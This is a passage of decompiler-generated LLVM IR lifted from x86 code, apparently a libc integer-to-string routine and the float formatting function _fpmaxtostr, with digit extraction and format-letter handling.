  %div = udiv i32 -1, %v0_80648df
  %tmp43 = urem i32 -1, %v0_80648df
  store i8 0, i8* %arg1, align 1
  %v1_80648e5 = add i32 %tmp43, 1
  %v1_80648e6 = load i32, i32* %edi.global-to-local, align 4
  %v12_80648e6 = icmp eq i32 %v1_80648e5, %v1_80648e6
  %v1_80648f0 = icmp eq i1 %v12_80648e6, false
  br i1 %v1_80648f0, label %dec_label_pc_80648ff, label %dec_label_pc_80648f2

dec_label_pc_80648f2:                             ; preds = %dec_label_pc_80648da
  %v1_80648f2 = add i32 %div, 1
  br label %dec_label_pc_80648ff

dec_label_pc_80648ff:                             ; preds = %dec_label_pc_80648da, %dec_label_pc_80648f2
  %stack_var_-24.0.off0 = phi i32 [ %v1_80648e5, %dec_label_pc_80648da ], [ 0, %dec_label_pc_80648f2 ]
  %stack_var_-28.0 = phi i32 [ %div, %dec_label_pc_80648da ], [ %v1_80648f2, %dec_label_pc_80648f2 ]
  %v0_80648ff = load i32, i32* %ecx.global-to-local, align 4
  store i32 %v0_80648ff, i32* %esi.global-to-local, align 4
  %v0_8064901 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8064901, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8064907

dec_label_pc_8064907:                             ; preds = %dec_label_pc_8064963, %dec_label_pc_80648ff
  %v0_8064949 = phi i32 [ %v0_80648ff, %dec_label_pc_80648ff ], [ %v1_806496a, %dec_label_pc_8064963 ]
  %stack_var_-20.0.off014 = phi i32 [ %v0_8064901, %dec_label_pc_80648ff ], [ %stack_var_-20.1.off0, %dec_label_pc_8064963 ]
  %v5_8064907 = icmp eq i32 %stack_var_-20.0.off014, 0
  br i1 %v5_8064907, label %dec_label_pc_8064949, label %dec_label_pc_806490e

dec_label_pc_806490e:                             ; preds = %dec_label_pc_8064907
  %v0_8064914 = load i32, i32* %edi.global-to-local, align 4
  %div8 = udiv i32 %stack_var_-20.0.off014, %v0_8064914
  %tmp44 = urem i32 %stack_var_-20.0.off014, %v0_8064914
  %v4_8064922 = mul i32 %tmp44, %stack_var_-24.0.off0
  %div26 = udiv i32 %v0_8064949, %v0_8064914
  %tmp45 = urem i32 %v0_8064949, %v0_8064914
  %v2_8064933 = add i32 %tmp45, %v4_8064922
  %v7_8064939 = mul i32 %tmp44, %stack_var_-28.0
  %v2_806493e = add i32 %div26, %v7_8064939
  store i32 %v2_806493e, i32* %ebx.global-to-local, align 4
  %div9 = udiv i32 %v2_8064933, %v0_8064914
  %tmp46 = urem i32 %v2_8064933, %v0_8064914
  %v2_8064944 = add i32 %div9, %v2_806493e
  br label %dec_label_pc_8064951

dec_label_pc_8064949:                             ; preds = %dec_label_pc_8064907
  %v0_806494d = load i32, i32* %edi.global-to-local, align 4
  %div11 = udiv i32 %v0_8064949, %v0_806494d
  %tmp47 = urem i32 %v0_8064949, %v0_806494d
  br label %dec_label_pc_8064951

dec_label_pc_8064951:                             ; preds = %dec_label_pc_806490e, %dec_label_pc_8064949
  %storemerge = phi i32 [ %div11, %dec_label_pc_8064949 ], [ %v2_8064944, %dec_label_pc_806490e ]
  %v2_8064957 = phi i32 [ %div11, %dec_label_pc_8064949 ], [ %div9, %dec_label_pc_806490e ]
  %v0_8064957 = phi i32 [ %tmp47, %dec_label_pc_8064949 ], [ %tmp46, %dec_label_pc_806490e ]
  %stack_var_-20.1.off0 = phi i32 [ 0, %dec_label_pc_8064949 ], [ %div8, %dec_label_pc_806490e ]
  store i32 %storemerge, i32* %esi.global-to-local, align 4
  %v0_8064951 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8064951 = add i32 %v0_8064951, -1
  store i32 %v1_8064951, i32* %ebp.global-to-local, align 4
  %tmp = icmp ult i32 %v0_8064957, 10
  br i1 %tmp, label %dec_label_pc_8064957, label %dec_label_pc_806495d

dec_label_pc_8064957:                             ; preds = %dec_label_pc_8064951
  %v3_8064957 = and i32 %v2_8064957, -256
  %v2_8064959 = add i32 %v0_8064957, 48
  %v12_8064959 = and i32 %v2_8064959, 255
  %v15_8064959 = or i32 %v12_8064959, %v3_8064957
  br label %dec_label_pc_8064963

dec_label_pc_806495d:                             ; preds = %dec_label_pc_8064951
  %v6_806495d = and i32 %v2_8064957, -256
  %v4_8064961 = add i32 %v0_8064957, %arg5
  %v19_8064961 = and i32 %v4_8064961, 255
  %v22_8064961 = or i32 %v19_8064961, %v6_806495d
  br label %dec_label_pc_8064963

dec_label_pc_8064963:                             ; preds = %dec_label_pc_8064957, %dec_label_pc_806495d
  %storemerge10 = phi i32 [ %v15_8064959, %dec_label_pc_8064957 ], [ %v22_8064961, %dec_label_pc_806495d ]
  %v1_8064963 = trunc i32 %storemerge10 to i8
  %v3_8064963 = inttoptr i32 %v1_8064951 to i8*
  store i8 %v1_8064963, i8* %v3_8064963, align 1
  %v1_806496a = load i32, i32* %esi.global-to-local, align 4
  %v2_806496a = or i32 %v1_806496a, %stack_var_-20.1.off0
  %v3_806496a = icmp eq i32 %v2_806496a, 0
  %v1_806496c = icmp eq i1 %v3_806496a, false
  br i1 %v1_806496c, label %dec_label_pc_8064907, label %dec_label_pc_806496e

dec_label_pc_806496e:                             ; preds = %dec_label_pc_8064963
  %v4_806496e = icmp eq i32 %storemerge12, 0
  br i1 %v4_806496e, label %dec_label_pc_806497a, label %dec_label_pc_8064975

dec_label_pc_8064975:                             ; preds = %dec_label_pc_806496e
  %v0_8064975 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8064975 = add i32 %v0_8064975, -1
  store i32 %v1_8064975, i32* %ebp.global-to-local, align 4
  %v1_8064976 = inttoptr i32 %v1_8064975 to i8*
  store i8 45, i8* %v1_8064976, align 1
  br label %dec_label_pc_806497a

dec_label_pc_806497a:                             ; preds = %dec_label_pc_806496e, %dec_label_pc_8064975
  %v0_806497d = load i32, i32* %ebp.global-to-local, align 4
  ret i32 %v0_806497d

; uselistorder directives
  uselistorder i32 %v0_8064957, { 2, 1, 0 }
  uselistorder i32 %v2_8064957, { 1, 0 }
  uselistorder i32 %div9, { 1, 0 }
  uselistorder i32 %v2_8064933, { 1, 0 }
  uselistorder i32 %v0_8064914, { 3, 2, 0, 1, 4, 5 }
  uselistorder i32 %stack_var_-20.0.off014, { 1, 0, 2 }
  uselistorder i32 %v0_8064949, { 3, 2, 0, 1 }
  uselistorder i32 %v1_80648e5, { 1, 0 }
  uselistorder i32 %v0_80648df, { 1, 0 }
  uselistorder i32* %edi.global-to-local, { 1, 2, 3, 0, 4 }
  uselistorder i32* %ecx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ebx.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_806497a, { 1, 0 }
  uselistorder label %dec_label_pc_8064963, { 1, 0 }
  uselistorder label %dec_label_pc_8064951, { 1, 0 }
  uselistorder label %dec_label_pc_80648ff, { 1, 0 }
  uselistorder label %dec_label_pc_80648da, { 2, 1, 0 }
}

define i32 @_fpmaxtostr() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %fpu_stat_TOP.global-to-local = alloca i3, align 1
  %st0.global-to-local = alloca x86_fp80, align 4
  %zf.global-to-local = alloca i1, align 1
  store i3 0, i3* %fpu_stat_TOP.global-to-local, align 1
  %tmp134 = call i16 @__decompiler_undefined_function_4()
  %tmp143 = call x86_fp80 @__decompiler_undefined_function_9()
  %tmp144 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-27 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-22 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-49 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-70 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8064985 = load i32, i32* @edi, align 4
  %v0_8064986 = load i32, i32* @esi, align 4
  %v0_8064987 = load i32, i32* @ebx, align 4
  store i32 %v0_8064987, i32* %stack_var_-16, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 %tmp144, i32* %edx.global-to-local, align 4
  store i32 %tmp144, i32* %eax.global-to-local, align 4
  %v4_806499c = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v5_806499c = add i3 %v4_806499c, -1
  store x86_fp80 %tmp143, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_806499c, i3* %fpu_stat_TOP.global-to-local, align 1
  %v1_80649a3 = add i32 %tmp144, 8
  %v2_80649a3 = inttoptr i32 %v1_80649a3 to i8*
  %v3_80649a3 = load i8, i8* %v2_80649a3, align 1
  %v4_80649a3 = zext i8 %v3_80649a3 to i32
  %v6_80649a3 = and i32 %v0_8064987, -256
  %v7_80649a3 = or i32 %v4_80649a3, %v6_80649a3
  store i32 %v7_80649a3, i32* %ebx.global-to-local, align 4
  %v1_80649a6 = add i32 %tmp144, 4
  %v2_80649a6 = inttoptr i32 %v1_80649a6 to i32*
  %v3_80649a6 = load i32, i32* %v2_80649a6, align 4
  store i32 %v3_80649a6, i32* %eax.global-to-local, align 4
  %v1_80649a9 = inttoptr i32 %tmp144 to i32*
  %v2_80649a9 = load i32, i32* %v1_80649a9, align 4
  store i32 %v2_80649a9, i32* %ebp.global-to-local, align 4
  %v3_80649bb = and i32 %v3_80649a6, -256
  %v2_80649bd = or i8 %v3_80649a3, 32
  %v7_80649bd = zext i8 %v2_80649bd to i32
  %v10_80649bd = or i32 %v3_80649bb, %v7_80649bd
  store i32 %v10_80649bd, i32* %eax.global-to-local, align 4
  %v10_80649bf = icmp eq i8 %v2_80649bd, 97
  store i1 %v10_80649bf, i1* %zf.global-to-local, align 1
  %v1_80649c1 = icmp eq i1 %v10_80649bf, false
  br i1 %v1_80649c1, label %dec_label_pc_80649ca, label %dec_label_pc_80649c3

dec_label_pc_80649c3:                             ; preds = %entry
  %v2_80649c3 = add i8 %v3_80649a3, 6
  %v10_80649c3 = icmp eq i8 %v2_80649c3, 0
  store i1 %v10_80649c3, i1* %zf.global-to-local, align 1
  %v15_80649c3 = zext i8 %v2_80649c3 to i32
  %v18_80649c3 = or i32 %v15_80649c3, %v6_80649a3
  store i32 %v18_80649c3, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80649ca

dec_label_pc_80649ca:                             ; preds = %entry, %dec_label_pc_80649c3
  %stack_var_-207.0 = phi i8 [ %v3_80649a3, %entry ], [ %v2_80649c3, %dec_label_pc_80649c3 ]
  store i32 %tmp144, i32* %edi.global-to-local, align 4
  %v2_80649d1 = icmp slt i32 %v2_80649a9, 0
  store i32 6, i32* %eax.global-to-local, align 4
  %v3_80649e0 = select i1 %v2_80649d1, i32 6, i32 %v2_80649a9
  store i32 %v3_80649e0, i32* %ebp.global-to-local, align 4
  %v1_80649e3 = add i32 %tmp144, 12
  %v2_80649e3 = inttoptr i32 %v1_80649e3 to i32*
  %v3_80649e3 = load i32, i32* %v2_80649e3, align 4
  store i32 %v3_80649e3, i32* %eax.global-to-local, align 4
  %v2_80649e6 = and i32 %v3_80649e3, 2
  %v3_80649e6 = icmp eq i32 %v2_80649e6, 0
  store i1 %v3_80649e6, i1* %zf.global-to-local, align 1
  br i1 %v3_80649e6, label %dec_label_pc_80649f4, label %dec_label_pc_8064a00

dec_label_pc_80649f4:                             ; preds = %dec_label_pc_80649ca
  %v2_80649f4 = urem i32 %v3_80649e3, 2
  %v3_80649f4 = icmp eq i32 %v2_80649f4, 0
  store i1 %v3_80649f4, i1* %zf.global-to-local, align 1
  %tmp177 = trunc i32 %v2_80649f4 to i8
  %tmp = sub nsw i8 0, %tmp177
  %tmp178 = and i8 %tmp, 32
  br label %dec_label_pc_8064a00

dec_label_pc_8064a00:                             ; preds = %dec_label_pc_80649f4, %dec_label_pc_80649ca
  %stack_var_-26.0 = phi i8 [ 32, %dec_label_pc_80649ca ], [ %tmp178, %dec_label_pc_80649f4 ]
  store i1 true, i1* %zf.global-to-local, align 1
  %not.v5_8064a00 = fcmp uno x86_fp80 %tmp143, 0xK00000000000000000000
  br i1 %not.v5_8064a00, label %dec_label_pc_8064a77, label %dec_label_pc_8064a22

dec_label_pc_8064a22:                             ; preds = %dec_label_pc_8064a00
  %v1_8064a22 = add i3 %v4_806499c, -2
  store i3 %v1_8064a22, i3* %fpu_stat_TOP.global-to-local, align 1
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  %v4_8064a26 = fcmp ogt x86_fp80 %tmp143, 0xK00000000000000000000
  br i1 %v4_8064a26, label %bb, label %bb168

bb:                                               ; preds = %dec_label_pc_8064a22
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8064a73

bb168:                                            ; preds = %dec_label_pc_8064a22
  %v5_8064a26 = fcmp olt x86_fp80 %tmp143, 0xK00000000000000000000
  br i1 %v5_8064a26, label %bb169, label %dec_label_pc_8064a2a

bb169:                                            ; preds = %bb168
  store i1 false, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8064a73

dec_label_pc_8064a2a:                             ; preds = %bb168
  store i1 true, i1* %zf.global-to-local, align 1
  %not.v4_8064a24 = fcmp une x86_fp80 %tmp143, 0xK00000000000000000000
  br i1 %not.v4_8064a24, label %dec_label_pc_8064a73, label %dec_label_pc_8064b38

dec_label_pc_8064a73:                             ; preds = %bb, %bb169, %dec_label_pc_8064a2a
  store x86_fp80 0xK00000000000000000000, x86_fp80* %st0.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i3 %v5_806499c, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_8064a77

dec_label_pc_8064a77:                             ; preds = %dec_label_pc_8064a00, %dec_label_pc_8064a73
  %stack_var_-148.0 = phi i8* [ null, %dec_label_pc_8064a73 ], [ inttoptr (i32 8 to i8*), %dec_label_pc_8064a00 ]
  store i3 %v4_806499c, i3* %fpu_stat_TOP.global-to-local, align 1
  store i32 %tmp144, i32* %eax.global-to-local, align 4
  %v9_8064a7e = icmp eq i8 %stack_var_-207.0, 96
  store i1 %v9_8064a7e, i1* %zf.global-to-local, align 1
  store i32 3, i32* %stack_var_-152, align 4
  %v1_8064a93 = add i32 %tmp144, 16
  %v2_8064a93 = inttoptr i32 %v1_8064a93 to i32*
  store i32 32, i32* %v2_8064a93, align 4
  %v6_8064a9a = icmp ugt i8 %stack_var_-207.0, 96
  br i1 %v6_8064a9a, label %dec_label_pc_8064aa1, label %dec_label_pc_8064a9c

dec_label_pc_8064a9c:                             ; preds = %dec_label_pc_8064a77
  %v4_8064a9c = ptrtoint i8* %stack_var_-148.0 to i32
  %v5_8064a9c = or i32 %v4_8064a9c, 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v23_8064a9c = inttoptr i32 %v5_8064a9c to i8*
  br label %dec_label_pc_8064aa1

dec_label_pc_8064aa1:                             ; preds = %dec_label_pc_8064a77, %dec_label_pc_8064a9c
  %stack_var_-148.1 = phi i8* [ %stack_var_-148.0, %dec_label_pc_8064a77 ], [ %v23_8064a9c, %dec_label_pc_8064a9c ]
  %v10_8064aa1 = icmp eq i8* %stack_var_-148.1, inttoptr (i32 sub (i32 0, i32 ptrtoint ([4 x i8]* @global_var_80702c0.1680 to i32)) to i8*)
  store i1 %v10_8064aa1, i1* %zf.global-to-local, align 1
  %v2_8064aa9 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %v2_8064aa9, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8064e71

dec_label_pc_8064b38:                             ; preds = %dec_label_pc_8064a2a
  store x86_fp80 0xK3FFF8000000000000000, x86_fp80* %st0.global-to-local, align 4
  store i3 %v5_806499c, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_8064b3c = ptrtoint i32* %stack_var_-70 to i32
  store i32 %v2_8064b3c, i32* %edx.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v6_8064b49 = and i32 %v3_80649e3, -65536
  %v1_8064b4e = udiv i16 %tmp134, 256
  %v2_8064b4e = zext i16 %v1_8064b4e to i32
  %v3_8064b4e = or i32 %v2_8064b4e, 12
  store i1 false, i1* %zf.global-to-local, align 1
  %v10_8064b4e = mul nuw nsw i32 %v3_8064b4e, 256
  %tmp179 = urem i16 %tmp134, 256
  %v4_8064b49.masked = zext i16 %tmp179 to i32
  %v11_8064b4e = or i32 %v10_8064b4e, %v4_8064b49.masked
  %v12_8064b4e = or i32 %v11_8064b4e, %v6_8064b49
  store i32 %v12_8064b4e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8064b56

dec_label_pc_8064b56:                             ; preds = %dec_label_pc_8064bac.dec_label_pc_8064b56_crit_edge, %dec_label_pc_8064b38
  %v1_8064b56 = phi i3 [ %v5_806499c, %dec_label_pc_8064b38 ], [ %v1_8064b56.pre, %dec_label_pc_8064bac.dec_label_pc_8064b56_crit_edge ]
  %v2_8064b7b = phi x86_fp80 [ 0xK3FFF8000000000000000, %dec_label_pc_8064b38 ], [ %v0_8064b56.pre, %dec_label_pc_8064bac.dec_label_pc_8064b56_crit_edge ]
  %stack_var_-212.0 = phi i32 [ %v2_8064b3c, %dec_label_pc_8064b38 ], [ %v4_8064b76, %dec_label_pc_8064bac.dec_label_pc_8064b56_crit_edge ]
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 0, i32* %edi.global-to-local, align 4
  %tmp180 = fptosi x86_fp80 %v2_8064b7b to i32
  store i32 %tmp180, i32* %eax.global-to-local, align 4
  store i32 %tmp180, i32* %ecx.global-to-local, align 4
  %v5_8064b70 = sitofp i32 %tmp180 to x86_fp80
  %v4_8064b76 = add i32 %stack_var_-212.0, 9
  %v12_8064b76 = icmp eq i32 %v4_8064b76, 0
  store i1 %v12_8064b76, i1* %zf.global-to-local, align 1
  %v4_8064b7b = fsub x86_fp80 %v2_8064b7b, %v5_8064b70
  store i3 %v1_8064b56, i3* %fpu_stat_TOP.global-to-local, align 1
  %v4_8064b7d = fmul x86_fp80 %v4_8064b7b, 0xK401CEE6B280000000000
  store x86_fp80 %v4_8064b7d, x86_fp80* %st0.global-to-local, align 4
  br label %dec_label_pc_8064b83

dec_label_pc_8064b83:                             ; preds = %dec_label_pc_8064b83.dec_label_pc_8064b83_crit_edge, %dec_label_pc_8064b56
  %v0_8064b97 = phi i32 [ %v0_8064b97.pre, %dec_label_pc_8064b83.dec_label_pc_8064b83_crit_edge ], [ %tmp180, %dec_label_pc_8064b56 ]
  %v0_8064b87 = phi i32 [ %v0_8064b87.pre, %dec_label_pc_8064b83.dec_label_pc_8064b83_crit_edge ], [ 0, %dec_label_pc_8064b56 ]
  %v1_8064b87 = add i32 %v0_8064b87, 1
  store i32 %v1_8064b87, i32* %edi.global-to-local, align 4
  store i32 10, i32* %ebx.global-to-local, align 4
  %v2_8064b91 = sub i32 %v4_8064b76, %v1_8064b87
  %div = udiv i32 %v0_8064b97, 10
  %tmp170 = urem i32 %v0_8064b97, 10
  store i32 %div, i32* %ecx.global-to-local, align 4
  %v3_8064b9d = and i32 %div, 536870656
  store i32 %v2_8064b91, i32* %edx.global-to-local, align 4
  %v1_8064ba3 = trunc i32 %tmp170 to i8
  %v2_8064ba3 = or i8 %v1_8064ba3, 48
  %v12_8064ba3 = zext i8 %v2_8064ba3 to i32
  %v15_8064ba3 = or i32 %v12_8064ba3, %v3_8064b9d
  store i32 %v15_8064ba3, i32* %eax.global-to-local, align 4
  %v10_8064ba5 = icmp eq i32 %v0_8064b87, 7
  store i1 %v10_8064ba5, i1* %zf.global-to-local, align 1
  %v3_8064ba8 = inttoptr i32 %v2_8064b91 to i8*
  store i8 %v2_8064ba3, i8* %v3_8064ba8, align 1
  %v7_8064baa = icmp sgt i32 %v1_8064b87, 8
  br i1 %v7_8064baa, label %dec_label_pc_8064bac, label %dec_label_pc_8064b83.dec_label_pc_8064b83_crit_edge

dec_label_pc_8064b83.dec_label_pc_8064b83_crit_edge: ; preds = %dec_label_pc_8064b83
  %v0_8064b87.pre = load i32, i32* %edi.global-to-local, align 4
  %v0_8064b97.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8064b83

dec_label_pc_8064bac:                             ; preds = %dec_label_pc_8064b83
  %v0_8064bac = load i32, i32* %esi.global-to-local, align 4
  %v1_8064bac = add i32 %v0_8064bac, 1
  store i32 %v1_8064bac, i32* %esi.global-to-local, align 4
  %v10_8064bad = icmp eq i32 %v0_8064bac, 1
  store i1 %v10_8064bad, i1* %zf.global-to-local, align 1
  %v7_8064bb0 = icmp sgt i32 %v1_8064bac, 2
  br i1 %v7_8064bb0, label %dec_label_pc_8064bb2, label %dec_label_pc_8064bac.dec_label_pc_8064b56_crit_edge

dec_label_pc_8064bac.dec_label_pc_8064b56_crit_edge: ; preds = %dec_label_pc_8064bac
  %v0_8064b56.pre = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v1_8064b56.pre = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  br label %dec_label_pc_8064b56

dec_label_pc_8064bb2:                             ; preds = %dec_label_pc_8064bac
  %v0_8064bb2 = load i3, i3* %fpu_stat_TOP.global-to-local, align 1
  %v2_8064bb2 = add i3 %v0_8064bb2, 1
  store i3 %v2_8064bb2, i3* %fpu_stat_TOP.global-to-local, align 1
  %v6_8064bb9 = icmp ugt i8 %stack_var_-207.0, 96
  br i1 %v6_8064bb9, label %dec_label_pc_8064bc8, label %dec_label_pc_8064bbb

dec_label_pc_8064bbb:                             ; preds = %dec_label_pc_8064bb2
  %v4_8064bc3 = add i8 %stack_var_-207.0, 32
  br label %dec_label_pc_8064bc8

dec_label_pc_8064bc8:                             ; preds = %dec_label_pc_8064bb2, %dec_label_pc_8064bbb
  %stack_var_-207.1 = phi i8 [ %v4_8064bc3, %dec_label_pc_8064bbb ], [ %stack_var_-207.0, %dec_label_pc_8064bb2 ]
  %stack_var_-42.0 = phi i32 [ 69, %dec_label_pc_8064bbb ], [ 101, %dec_label_pc_8064bb2 ]
  %v12_8064bc8 = icmp eq i8 %stack_var_-207.1, 103
  store i1 %v12_8064bc8, i1* %zf.global-to-local, align 1
  %v1_8064bcd = icmp eq i1 %v12_8064bc8, false
  br i1 %v1_8064bcd, label %dec_label_pc_8064bd6, label %dec_label_pc_8064bcf

dec_label_pc_8064bcf:                             ; preds = %dec_label_pc_8064bc8
  %v0_8064bcf = load i32, i32* %ebp.global-to-local, align 4
  %v1_8064bcf = icmp eq i32 %v0_8064bcf, 0
  store i1 %v1_8064bcf, i1* %zf.global-to-local, align 1
  %tmp171 = icmp slt i32 %v0_8064bcf, 1
  br i1 %tmp171, label %dec_label_pc_8064bdd, label %dec_label_pc_8064bd3

dec_label_pc_8064bd3:                             ; preds = %dec_label_pc_8064bcf
  %v1_8064bd3 = add i32 %v0_8064bcf, -1
  %v8_8064bd3 = icmp eq i32 %v1_8064bd3, 0
  store i1 %v8_8064bd3, i1* %zf.global-to-local, align 1
  store i32 %v1_8064bd3, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8064bdd

dec_label_pc_8064bd6:                             ; preds = %dec_label_pc_8064bc8
  %v12_8064bd6 = icmp eq i8 %stack_var_-207.1, 102
  store i1 %v12_8064bd6, i1* %zf.global-to-local, align 1
  br i1 %v12_8064bd6, label %dec_label_pc_8064be1, label %dec_label_pc_8064bd6.dec_label_pc_8064bdd_crit_edge

dec_label_pc_8064bd6.dec_label_pc_8064bdd_crit_edge: ; preds = %dec_label_pc_8064bd6
  %v0_8064bdd.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8064bdd

dec_label_pc_8064bdd:                             ; preds = %dec_label_pc_8064bd6.dec_label_pc_8064bdd_crit_edge, %dec_label_pc_8064bcf, %dec_label_pc_8064bd3
  %v0_8064bdd = phi i32 [ %v0_8064bdd.pre, %dec_label_pc_8064bd6.dec_label_pc_8064bdd_crit_edge ], [ %v0_8064bcf, %dec_label_pc_8064bcf ], [ %v1_8064bd3, %dec_label_pc_8064bd3 ]
  store i32 %v0_8064bdd, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8064c0b

dec_label_pc_8064be1:                             ; preds = %dec_label_pc_8064bd6
  store i32 -1, i32* %edi.global-to-local, align 4
  %v0_8064be5 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8064be5 = add i32 %v0_8064be5, -1
  store i32 %v2_8064be5, i32* %ebx.global-to-local, align 4
  %v11_8064be9 = icmp eq i32 %v0_8064be5, 0
  store i1 %v11_8064be9, i1* %zf.global-to-local, align 1
  %v5_8064bec = icmp slt i32 %v2_8064be5, -1
  br i1 %v5_8064bec, label %dec_label_pc_8064bee, label %dec_label_pc_8064c0b

dec_label_pc_8064bee:                             ; preds = %dec_label_pc_8064be1
  store i32 808464432, i32* %eax.global-to-local, align 4
  %v2_8064bf3 = ptrtoint i32* %stack_var_-72 to i32
  store i32 808464432, i32* %stack_var_-72, align 4
  %v4_8064bfa = load i1, i1* @df, align 1
  %v5_8064bfa = select i1 %v4_8064bfa, i32 -4, i32 4
  %v6_8064bfa = add i32 %v5_8064bfa, %v2_8064bf3
  store i32 %v6_8064bfa, i32* %edi.global-to-local, align 4
  %v2_8064bfb = inttoptr i32 %v6_8064bfa to i32*
  store i32 808464432, i32* %v2_8064bfb, align 4
  %v3_8064bfb = load i32, i32* %edi.global-to-local, align 4
  %v6_8064bfb = add i32 %v3_8064bfb, %v5_8064bfa
  store i32 %v6_8064bfb, i32* %edi.global-to-local, align 4
  %v0_8064bfc = load i32, i32* %eax.global-to-local, align 4
  %v2_8064bfc = inttoptr i32 %v6_8064bfb to i32*
  store i32 %v0_8064bfc, i32* %v2_8064bfc, align 4
  %v3_8064bfc = load i32, i32* %edi.global-to-local, align 4
  %v6_8064bfc = add i32 %v3_8064bfc, %v5_8064bfa
  store i32 %v6_8064bfc, i32* %edi.global-to-local, align 4
  %v0_8064bfd = load i32, i32* %eax.global-to-local, align 4
  %v2_8064bfd = inttoptr i32 %v6_8064bfc to i32*
  store i32 %v0_8064bfd, i32* %v2_8064bfd, align 4
  %v3_8064bfd = load i32, i32* %edi.global-to-local, align 4
  %v6_8064bfd = add i32 %v3_8064bfd, %v5_8064bfa
  store i32 %v6_8064bfd, i32* %edi.global-to-local, align 4
  %v0_8064bfe = load i32, i32* %eax.global-to-local, align 4
  %v2_8064bfe = inttoptr i32 %v6_8064bfd to i32*
  store i32 %v0_8064bfe, i32* %v2_8064bfe, align 4
  %v3_8064bfe = load i32, i32* %edi.global-to-local, align 4
  %v6_8064bfe = add i32 %v3_8064bfe, %v5_8064bfa
  store i32 %v6_8064bfe, i32* %edi.global-to-local, align 4
  %v0_8064bff = load i32, i32* %eax.global-to-local, align 4
  %v1_8064bff = trunc i32 %v0_8064bff to i8
  %v3_8064bff = inttoptr i32 %v6_8064bfe to i8*
  store i8 %v1_8064bff, i8* %v3_8064bff, align 1
  %v4_8064bff = load i32, i32* %edi.global-to-local, align 4
  %v5_8064bff = load i1, i1* @df, align 1
  %v6_8064bff = select i1 %v5_8064bff, i32 -1, i32 1
  %v7_8064bff = add i32 %v6_8064bff, %v4_8064bff
  store i32 %v7_8064bff, i32* %edi.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8064c0b

dec_label_pc_8064c0b:                             ; preds = %dec_label_pc_8064be1, %dec_label_pc_8064bdd, %dec_label_pc_8064bee
  %v1_8064c2b = phi i32 [ %v0_8064bdd, %dec_label_pc_8064bdd ], [ -1, %dec_label_pc_8064bee ], [ %v2_8064be5, %dec_label_pc_8064be1 ]
  %v10_8064c0b = icmp eq i32 %v1_8064c2b, 20
  store i1 %v10_8064c0b, i1* %zf.global-to-local, align 1
  store i32 0, i32* %stack_var_-72, align 4
  store i32 48, i32* %stack_var_-71, align 4
  %v7_8064c1e = icmp sgt i32 %v1_8064c2b, 20
  br i1 %v7_8064c1e, label %dec_label_pc_8064c20, label %dec_label_pc_8064c2b

dec_label_pc_8064c20:                             ; preds = %dec_label_pc_8064c0b
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_8064c22 = ptrtoint i32* %stack_var_-49 to i32
  store i32 %v2_8064c22, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8064c3f

dec_label_pc_8064c2b:                             ; preds = %dec_label_pc_8064c0b
  %v0_8064c2b = load i32, i32* @esp, align 4
  %v2_8064c2b = add i32 %v1_8064c2b, 181
  %v3_8064c2b = add i32 %v2_8064c2b, %v0_8064c2b
  store i32 %v3_8064c2b, i32* %eax.global-to-local, align 4
  %v1_8064c32 = add i32 %v3_8064c2b, 2
  %v2_8064c32 = inttoptr i32 %v1_8064c32 to i8*
  %v3_8064c32 = load i8, i8* %v2_8064c32, align 1
  %v8_8064c32 = icmp ult i8 %v3_8064c32, 53
  %v12_8064c32 = icmp eq i8 %v3_8064c32, 53
  store i1 %v12_8064c32, i1* %zf.global-to-local, align 1
  store i32 %v1_8064c32, i32* %ecx.global-to-local, align 4
  %v1_8064c39 = icmp eq i1 %v8_8064c32, false
  %v2_8064c39 = zext i1 %v1_8064c39 to i32
  store i32 %v2_8064c39, i32* %eax.global-to-local, align 4
